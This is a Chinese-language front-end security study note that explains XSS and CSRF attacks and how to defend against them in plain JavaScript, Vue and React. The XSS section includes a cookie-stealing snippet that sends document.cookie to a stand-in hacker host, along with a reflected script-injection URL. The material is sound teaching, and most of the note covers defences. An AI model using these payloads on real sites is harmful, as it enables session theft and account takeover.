---
sidebar: auto
sidebarDepth: 2
---

# 网络安全

## 重要性
随着互联网的发达，各种WEB应用也变得越来越复杂，满足了用户的各种需求，但是随之而来的就是各种网络安全的问题。了解常见的前端攻击形式和保护我们的网站不受攻击是我们每个优秀fronter必备的技能。

## 分类
- XSS攻击
- CSRF攻击
- 网络劫持攻击(运营商劫持)
- 控制台注入代码
- 虚假网站钓鱼

## XSS攻击
XSS是一种经常出现在web应用中的计算机安全漏洞，为了和 CSS 区分，这里把攻击的第一个字母改成了X，于是叫做XSS，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)，从而发起非法行为和获取网站的敏感数据。

### 发起方式
**实施XSS攻击需要具备两个条件**
- 一、需要向web页面注入恶意代码, 利用表单和url地址栏的查询字符串注入js非法代码
- 二、这些恶意代码能够被浏览器成功的执行

**XSS攻击的主要目的**
- 一、窃取Cookies和私信信息，发送到黑客网站上
```js
var i=document.createElement("img");
document.body.appendChild(i);
i.src = "http://www.hackerserver.com/?c=" + document.cookie;
```
- 二、发起非法行为
```js
地址栏：
http://www.xxx.com/?id=" /><script>alert(/xss/)</script><br x="

把id放入到img之后最终反射出来的HTML代码：
<div>
    <img src="/images/handler.ashx?id=" /><script>alert(/xss/)</script><br x="" />
</div>
```

### 经典案例
[CSDN注入](https://www.secpulse.com/archives/17830.html)  
[七种主要的XSS案例](https://www.anquanke.com/post/id/86585)

### 防范措施
DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。
- 在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等。
- 转义HTML，过滤用户输入的 检查用户输入的内容中是否有非法内容。如<>（尖括号）、”（引号）、 ‘（单引号）、%（百分比符号）、;（分号）、()（括号）、&（& 符号）、+（加号）等。、严格控制输出。
- 如果用 Vue/React 技术栈，并且不使用 v-html/dangerouslySetInnerHTML 功能，就在前端 render 阶段避免 innerHTML、outerHTML 的 XSS 隐患。
- DOM 中的内联事件监听器，如 location、onclick、onerror、onload、onmouseover 等，a标签的 href 属性，JavaScript 的 eval()、setTimeout()、setInterval() 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。
```js
 <!-- 内联事件监听器中包含恶意代码 --> 
 < img   onclick = "UNTRUSTED"   onerror = "UNTRUSTED"   src = "data:image/png," > 
 <!-- 链接内包含恶意代码 --> 
 < a   href = "UNTRUSTED" > 1 </ a > 
 < script >  
 // setTimeout()/setInterval() 中调用恶意代码 
setTimeout( "UNTRUSTED" )
setInterval( "UNTRUSTED" )
 // location 调用恶意代码 
location.href =  'UNTRUSTED' 
 // eval() 中调用恶意代码 
 eval ( "UNTRUSTED" )
  </ script > 
```


## CSRF攻击
攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。
Cookie是按照Domain存储的，当请求一个网站的时候，浏览器会自动把这个网站的Cookie发送过去。

### 发起方式
1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；
4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 

### 图解流程
![图解CSRF](/study/security/csrf.png)

#### 防范措施
CSRF攻击是攻击者利用用户的身份(Cookie)操作用户帐户的一种攻击方式，我们可以利用修改登录态的位置（由cookie中放到地址栏或者自定义请求头部）和refer的判断来防御CSRF攻击，由前端和服务端配合一起解决CSRF攻击。
- **验证HTTP Referer字段**  
根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory，用户必须在 bank.example网站发起请求，referer的域名一定指向bank.example。如果 Referer 是其他网站的话，则有可能是黑客的CSRF攻击，拒绝该请求。但Referer值是由浏览器提供的，服务端可以绕过这个限制修改Referer字段发起攻击。
- **在HTTP头中自定义属性并验证**  
这种方法是使用token并进行验证，把token的位置由Cookie移到http请求的头部，使第三方网站无法盗用身份信息。解决了在请求地址栏中加入token的不便，同时通过 XMLHttpRequest请求的地址不会被记录到浏览器的地址栏，也不用担心token会透过 Referer泄露到其他网站中去。
- **添加验证码操作**  
增加与用户的互动，即便是最简陋的验证码也能起到很好的效果

## XSS与CSRF之间的区别
| 攻击类型 | 字面理解 | 宿主网站 | 攻击方式|
| ------- | -----  | :----:  | ---- |
| XSS(cross site script)|跨站脚本攻击，在别人的网站注入JS脚本以触发非法操作或者获取别人网站的私密信息| A网站 | 给A网站注入JS脚本|
| CSRF(cross site request forgery)|跨站请求伪造，在钓鱼网站伪装成正常网站，非法使用浏览器自带Cookie的机制发起伪造正常网站的请求| A网站 | 在B网站借助A网站的Cookie，伪造发起A网站的请求|


## 在Vue与React中的防范措施
- JSX中防止XSS注入攻击
  - React DOM 在渲染所有输入内容之前，默认会进行转义。它可以确保在你的应用中，永远不会注入那些并非自己明确编写的内容。所有的内容在渲染之前都被转换成了字符串。这样可以有效地防止 XSS（cross-site-scripting, 跨站脚本）攻击。
  - dangerouslySetInnerHTML 是 React 为浏览器 DOM 提供 innerHTML 的替换方案。但当你想设置 dangerouslySetInnerHTML 时，需要向其传递包含 key 为 __html 的对象，以此来警示你。

- 在Vue中尽量不要使用v-html
  - 在网站上动态渲染任意 HTML 是非常危险的，因为容易导致 XSS 攻击。只在可信内容上使用 v-html，永不用在用户提交的内容上。